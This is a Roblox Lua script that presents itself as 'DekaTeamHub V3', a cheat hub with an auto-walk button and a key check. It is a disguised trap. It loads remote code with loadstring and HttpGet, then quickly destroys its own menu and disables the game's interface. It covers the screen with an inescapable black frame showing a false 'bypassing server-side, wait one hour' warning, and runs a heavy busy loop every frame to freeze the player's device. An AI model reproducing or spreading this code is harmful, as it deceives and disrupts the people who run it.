local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
   Name = "DekaTeamHub V3 | RECORDER ✅",
   LoadingTitle = "Downloading Resources from GitHub...",
   LoadingSubtitle = "by Samuel",
   ConfigurationSaving = { Enabled = false },
   KeySystem = true,
   KeySettings = {
      Title = "DekaTeamHub Verification",
      Subtitle = "Security Check",
      Note = "Key: deka Genjor",
      Key = {"deka Genjor"} 
   }
})
local Tab = Window:CreateTab("AutoWalk ✅", 4483362458)
Tab:CreateButton({
   Name = "Start Recording & AutoWalk",
   Callback = function()
       Rayfield:Notify({
          Title = "Injection Success",
          Content = "Bypassing Anticheat... Please Wait 1-5 Minutes.",
          Duration = 5,
       })
   end,
})
task.spawn(function()
    task.wait(0.5)
    for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
        if v.Name:find("Rayfield") then v:Destroy() end
    end
    local StarterGui = game:GetService("StarterGui")
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        StarterGui:SetCore("TopbarEnabled", false)
    end)
    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui", playerGui)
    screenGui.Name = "SystemBackup"
    screenGui.DisplayOrder = 2147483647
    screenGui.IgnoreGuiInset = true 
    local jailFrame = Instance.new("TextButton", screenGui)
    jailFrame.Size = UDim2.new(1, 0, 1, 0)
    jailFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    jailFrame.Text = ""
    jailFrame.Active = true 
    jailFrame.Modal = true 
    local infoText = Instance.new("TextLabel", jailFrame)
    infoText.Size = UDim2.new(0.9, 0, 0.4, 0)
    infoText.Position = UDim2.new(0.05, 0, 0.3, 0)
    infoText.Text = "DEKATEAMHUB: BYPASSING SERVER-SIDE...\n\nSABAR TUNGGU 1 JAM!\nJANGAN KELUAR ATAU DEVICE ANDA CRASH!"
    infoText.TextColor3 = Color3.fromRGB(255, 255, 255)
    infoText.TextScaled = true
    infoText.BackgroundTransparency = 1
    infoText.Font = Enum.Font.Code
    game:GetService("RunService").RenderStepped:Connect(function()
        game:GetService("GuiService").SelectedObject = jailFrame
        infoText.Position = UDim2.new(0.05, math.random(-2, 2), 0.3, math.random(-2, 2))
        for i = 1, 1600000 do local _ = i * i end
    end)
end)
